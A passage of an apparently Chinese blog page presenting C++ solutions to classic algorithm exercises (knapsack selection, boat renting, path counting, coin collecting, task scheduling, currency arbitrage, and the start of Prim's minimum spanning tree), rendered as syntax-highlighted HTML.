class="comment">输入1：可以支配的钱和可以选择的物品种类数</span></span><br><span class="line"><span class="comment">输入2：N行，每行为每种物品的价钱和受欢迎程度</span></span><br><span class="line"><span class="comment">输出1：可能达到的最大的受欢迎程度</span></span><br><span class="line"><span class="comment">输出2：购买的物品的编号（物品不重复购买）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Food</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> m_money;</span><br><span class="line">    <span class="keyword">int</span> m_value;</span><br><span class="line">&#125; Food;</span><br><span class="line">Food food[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">int</span> F[<span class="number">1000</span>][<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxlove</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= money; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((j - food[i].m_money) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                F[i][j] = max(F[i - <span class="number">1</span>][j], F[i - <span class="number">1</span>][j - food[i].m_money] + food[i].m_value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                F[i][j] = F[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> F[n][money];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> money, n;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; money &gt;&gt; n) &#123;</span><br><span class="line">        food[<span class="number">0</span>].m_money = <span class="number">0</span>;</span><br><span class="line">        food[<span class="number">0</span>].m_value = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; food[i].m_money &gt;&gt; food[i].m_value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> result=maxlove(n,money);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>;<span class="comment">//n是种类总数,money是钱</span></span><br><span class="line">        <span class="keyword">if</span>(result==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">int</span> remain = money;</span><br><span class="line">        <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (remain &gt;= food[i].m_money) &#123;</span><br><span class="line">                <span class="keyword">if</span> (F[i][remain] - F[i - <span class="number">1</span>][remain - food[i].m_money] == food[i].m_value) &#123;</span><br><span class="line">                    remain = remain - food[i].m_money;</span><br><span class="line">                    <span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">cout</span> &lt;&lt; n - i + <span class="number">1</span>;</span><br><span class="line">                        flag=<span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        <span class="built_in">cout</span> &lt;&lt;<span class="string">" "</span>&lt;&lt; n - i + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Renting-Boats"><a href="#Renting-Boats" class="headerlink" title="Renting Boats"></a>Renting Boats</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-28-171804.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 假设输入数据为：</span></span><br><span class="line"><span class="comment">                  4</span></span><br><span class="line"><span class="comment">            5 14 23</span></span><br><span class="line"><span class="comment">               5 12</span></span><br><span class="line"><span class="comment">                  8</span></span><br><span class="line"><span class="comment">以下为输入的数据分布（即m[i][j]）</span></span><br><span class="line"><span class="comment">    租船点\还船点</span></span><br><span class="line"><span class="comment">                0   1   2   3</span></span><br><span class="line"><span class="comment">            0   0   5   14  23</span></span><br><span class="line"><span class="comment">            1   0   0   5   12</span></span><br><span class="line"><span class="comment">            2   0   0   0   8</span></span><br><span class="line"><span class="comment">            3   0   0   0   0</span></span><br><span class="line"><span class="comment">p[i][j]：</span></span><br><span class="line"><span class="comment">    租船点\还船点</span></span><br><span class="line"><span class="comment">                0   1   2   3</span></span><br><span class="line"><span class="comment">            0   0   5   10  17</span></span><br><span class="line"><span class="comment">            1   0   0   5   12</span></span><br><span class="line"><span class="comment">            2   0   0   0   8</span></span><br><span class="line"><span class="comment">            3   0   0   0   0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">int</span> m[<span class="number">200</span>][<span class="number">200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">200</span>][<span class="number">200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; m[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> minNum = m[<span class="number">0</span>][i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            minNum = min(minNum, p[<span class="number">0</span>][j] + m[j][i]);</span><br><span class="line">        &#125;</span><br><span class="line">        p[<span class="number">0</span>][i] = minNum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; p[<span class="number">0</span>][n - <span class="number">1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Shortest-path-counting"><a href="#Shortest-path-counting" class="headerlink" title="Shortest path counting"></a>Shortest path counting</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-28-172016.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> P[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        P[<span class="number">0</span>][i]=<span class="number">1</span>;</span><br><span class="line">        P[i][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            P[i][j]=P[i<span class="number">-1</span>][j]+P[i][j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;P[n<span class="number">-1</span>][n<span class="number">-1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Coin-collecting-by-robot"><a href="#Coin-collecting-by-robot" class="headerlink" title="Coin-collecting by robot"></a>Coin-collecting by robot</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-28-172107.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">map</span>[<span class="number">1000</span>][<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;<span class="built_in">map</span>[i][j];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="built_in">map</span>[<span class="number">0</span>][i]=<span class="built_in">map</span>[<span class="number">0</span>][i<span class="number">-1</span>]+<span class="built_in">map</span>[<span class="number">0</span>][i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">map</span>[i][<span class="number">0</span>]=<span class="built_in">map</span>[i<span class="number">-1</span>][<span class="number">0</span>]+<span class="built_in">map</span>[i][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;m;j++)</span><br><span class="line">            <span class="built_in">map</span>[i][j]=max(<span class="built_in">map</span>[i<span class="number">-1</span>][j],<span class="built_in">map</span>[i][j<span class="number">-1</span>])+<span class="built_in">map</span>[i][j];</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">map</span>[n<span class="number">-1</span>][m<span class="number">-1</span>];</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Soldiers"><a href="#Soldiers" class="headerlink" title="Soldiers"></a>Soldiers</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-28-170631.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x[<span class="number">10001</span>],y[<span class="number">10001</span>];</span><br><span class="line">    <span class="keyword">int</span> xs,ys;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;x[i]&gt;&gt;y[i];</span><br><span class="line">        &#125;</span><br><span class="line">        sort(x,x+n);</span><br><span class="line">        sort(y,y+n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            x[i]-=i;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(x,x+n);</span><br><span class="line">        xs=ys=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            xs+=<span class="built_in">abs</span>(x[i]-x[n/<span class="number">2</span>]);</span><br><span class="line">            ys+=<span class="built_in">abs</span>(y[i]-y[n/<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;xs+ys&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Independent-Task-Scheduling"><a href="#Independent-Task-Scheduling" class="headerlink" title="Independent Task Scheduling"></a>Independent Task Scheduling</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-28-170826.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">202</span>][<span class="number">10000</span>];<span class="comment">//dp[i][j] 表示前i个作业中A机器花j分钟的时候 B机器所花时间</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">200</span>], b[<span class="number">200</span>];</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">        sum += a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= sum; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &lt; a[i]) &#123;<span class="comment">//A机器时间不足，只能用B的</span></span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j] + b[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//dp[i][j] = dp[i-1][j]+b[i]代表第i个任务交给B来做，所以做完前i个任务的时候,A机器和前i - 1的任务一样，还是花了j分钟，而B机器则花dp[i-1][j]+b[i]分钟；</span></span><br><span class="line">                <span class="comment">//dp[i][j] = dp[i-1][j-a[i]]代表第i个任务交给A来做，现在的A机器花费时间是j，所以在前i - 1个任务完成的时候，A机器是花了j-a[i]分钟的，所以现在B机器还是花了dp[i-1][j-a[i]]分钟；</span></span><br><span class="line">                dp[i][j] = min(dp[i - <span class="number">1</span>][j] + b[i], dp[i - <span class="number">1</span>][j - a[i]]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">999999</span>;</span><br><span class="line">    <span class="comment">//max(dp[n][i],i) 表示完成前n个作业A机器花i分钟 B机器花dp[n][i]分钟情况下，最迟完工时间</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= sum; i++)</span><br><span class="line">        ans = min(ans, max(dp[n][i], i));</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Arbitrage"><a href="#Arbitrage" class="headerlink" title="Arbitrage"></a>Arbitrage</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-28-170934.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt; money;</span><br><span class="line"><span class="keyword">double</span> rates[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Arbitrage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; n; k++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">double</span> tmp = rates[i][k] * rates[k][j];</span><br><span class="line">                rates[i][j] = max(tmp, rates[i][j]);</span><br><span class="line">                <span class="keyword">if</span> (rates[i][j] * rates[j][i] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>, countt = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n &amp;&amp; n) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="built_in">string</span> temp;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; temp;</span><br><span class="line">            money[temp] = i;</span><br><span class="line">            rates[i][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> m;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; m;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="built_in">string</span> a, b;</span><br><span class="line">            <span class="keyword">double</span> rate;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; a &gt;&gt; rate &gt;&gt; b;</span><br><span class="line">            rates[money[a]][money[b]] = rate;</span><br><span class="line">        &#125;</span><br><span class="line">        flag = Arbitrage();</span><br><span class="line">        <span class="keyword">if</span> (flag)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case "</span> &lt;&lt; countt++ &lt;&lt; <span class="string">" Yes"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case "</span> &lt;&lt; countt++ &lt;&lt; <span class="string">" No"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="求最小生成树-Prim算法）"><a href="#求最小生成树-Prim算法）" class="headerlink" title="求最小生成树(Prim算法）"></a>求最小生成树(Prim算法）</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-28-171033.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inf 32767</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> e;</span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">500</span>];</span><br><span class="line">    <span class="keyword">int</span> edge[<span class="number">500</span>][<span class="number">500</span>];</span><br><span class="line">&#125; Graph;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> cost;</span><br><span class="line">&#125; mincost;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">    <span class="keyword">int</span> weight;</span><br><span class="line">&#125; EDGE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span 